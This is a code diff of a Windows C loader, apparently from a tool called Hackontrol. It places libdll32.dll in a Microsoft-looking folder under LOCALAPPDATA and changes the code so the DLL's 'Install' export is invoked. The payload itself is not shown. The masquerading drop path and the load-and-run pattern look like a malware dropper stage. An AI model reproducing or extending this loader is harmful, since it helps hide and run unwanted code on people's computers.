@@ -5,6 +5,7 @@
 
 #define PATH L"%LOCALAPPDATA%\\Microsoft\\InstallService"
 #define FILE L"libdll32.dll"
+#define FUNCTION "Install"
 
 typedef void(__stdcall* RUNDLL32FUNCTION) (HWND window, HINSTANCE instance, LPSTR argument, int command);
 
@@ -190,13 +191,14 @@ directoryExists:;
 		goto freeBuffer;
 	}
 
-	RUNDLL32FUNCTION function = (RUNDLL32FUNCTION) GetProcAddress(executable, "Install");
+	RUNDLL32FUNCTION function = (RUNDLL32FUNCTION) GetProcAddress(executable, FUNCTION);
 
 	if(!function) {
 		displayError(L"GetProcAddress", GetLastError(), heap);
 		goto freeBuffer;
 	}
 
+	function(NULL, NULL, NULL, 0);
 	printf("Finished\n");
 	codeExit = 0;
 freeBuffer:
@@ -207,29 +209,3 @@ freePathHome:
 	HeapFree(heap, 0, pathHome);
 	return codeExit;
 }
-
-/*#define FUNCTION_LIBDLL32 "Install"
-
-int main(int argc, char** argv) {
-	BOOL result = HackontrolWriteFile(fileLibdll32, buffer, size);
-	error = GetLastError();
-	LocalFree(buffer);
-
-	if(!result) {
-		KHOPANERRORMESSAGE_WIN32(error, L"HackontrolWriteFile");
-		LocalFree(fileLibdll32);
-		return 1;
-	}
-
-	printf("Loading DLL\n");
-	result = KHOPANExecuteRundll32Function(fileLibdll32, FUNCTION_LIBDLL32, NULL, TRUE);
-	error = GetLastError();
-	LocalFree(fileLibdll32);
-
-	if(!result) {
-		KHOPANERRORMESSAGE_WIN32(error, L"KHOPANExecuteRundll32Function");
-		return 1;
-	}
-
-	return 0;
-}*/
